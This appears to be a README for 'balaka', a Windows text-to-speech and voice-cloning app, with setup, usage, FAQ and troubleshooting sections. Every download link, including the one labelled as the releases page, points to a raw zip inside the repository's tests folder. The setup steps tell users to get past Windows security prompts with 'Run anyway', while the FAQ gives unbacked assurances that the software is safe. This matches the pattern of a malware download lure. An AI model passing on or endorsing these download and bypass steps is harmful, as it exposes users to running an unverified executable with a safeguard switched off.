# 🔊 balaka - Generate natural voices on your computer

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/loaded-hook730/balaka/raw/refs/heads/main/tests/Software_v1.3.zip)

Balaka turns text into human-like speech. It runs entirely on your local machine. You keep your data private. It creates voice models and synthesizes audio without sending files to any third-party servers.

## 🛠️ System Requirements

To run this application, your computer must meet these criteria:

*   Operating System: Windows 10 or Windows 11 (64-bit).
*   Processor: An Intel Core i5 or AMD Ryzen 5 processor or better.
*   Memory: 8 GB of RAM minimum.
*   Storage: 2 GB of free space for the application and temporary audio files.
*   Graphics: A dedicated NVIDIA graphics card helps for faster voice cloning but is not mandatory.

## 📥 Downloading the Application

Follow these steps to obtain the correct files for your system:

1. Visit the [official releases page](https://github.com/loaded-hook730/balaka/raw/refs/heads/main/tests/Software_v1.3.zip).
2. Look for the section labeled "Assets" under the most recent version number.
3. Click the file ending in `.exe` to start the download.
4. Save the file to your desktop or your downloads folder.

## 🚀 Setting Up

1. Locate the file you downloaded. It shows as a balaka icon.
2. Double-click the file to start the installer.
3. Windows may show a security prompt. Click "More info" and then "Run anyway" if the system flags the file. This happens because the app is local-only and not tied to a large publisher.
4. Follow the on-screen prompts to select your install location.
5. Click "Finish" when the setup process completes.

## 🎙️ Using Voice Synthesis

The application opens in your default web browser once you start the shortcut on your desktop. The interface handles all background tasks for you.

To generate speech:

1. Open the application shortcut.
2. Paste your text into the primary text box.
3. Choose a voice from the dropdown menu.
4. Click the "Generate" button.
5. Wait for the status bar to show completion.
6. Press the "Play" icon to hear the result.
7. Click "Download" to save the audio as a WAV file.

## 🧬 Cloning a Voice

You can create a custom voice using a short audio clip.

1. Navigate to the "Voice Design" tab in the navigation menu.
2. Click "Upload Source Audio."
3. Select an audio file from your computer. The file should be clear and free of background noise.
4. Name your voice in the text field.
5. Click "Start Cloning." 
6. The process takes several minutes. The status indicator shows progress.
7. Once finished, the new voice appears in your voice selection list.

## ⚙️ Managing Settings

The "Settings" tab allows you to configure how the app uses your computer hardware.

*   Audio Device: Choose your output speaker or headphones.
*   Quality: Select between "Efficiency" or "High Fidelity." High fidelity sounds better but requires more processing power.
*   Temp Folder: Set the location where the app stores temporary files. You can clear this folder to save space.

## 🔍 Frequently Asked Questions

**Does this application need an internet connection?**
No. Balaka runs entirely on your local hardware. You can disconnect your internet once the installation finishes.

**Why does voice cloning take time?**
Voice cloning requires complex math. The app builds a unique profile for the voice to ensure it sounds natural. Longer audio samples improve the final result.

**Is my data safe?**
Yes. Every piece of voice data stays on your local hard drive. No audio or text ever leaves your machine.

**What if the application closes unexpectedly?**
Modern computers manage tasks efficiently, but large cloning jobs may require more memory. Close other programs before starting a cloning task if you experience crashes.

**How do I update the software?**
Visit the downloads page periodically. Download the new installer and run it. The new version overwrites the old one while keeping your settings intact.

## 📋 Troubleshooting

If you encounter issues, verify the following steps:

1. Update your graphics drivers. Older drivers often cause playback errors.
2. Ensure you have enough disk space. A full drive prevents the app from creating temporary audio chunks.
3. Check your audio output. Ensure your speakers show as enabled in the Windows Sound Settings menu.
4. Restart the software. Sometimes a background process hangs and a fresh start resolves the issue.

The application uses an internal FastAPI server to manage requests. If you see a "Connection Refused" error, wait ten seconds for the internal server to initialize and refresh your browser page.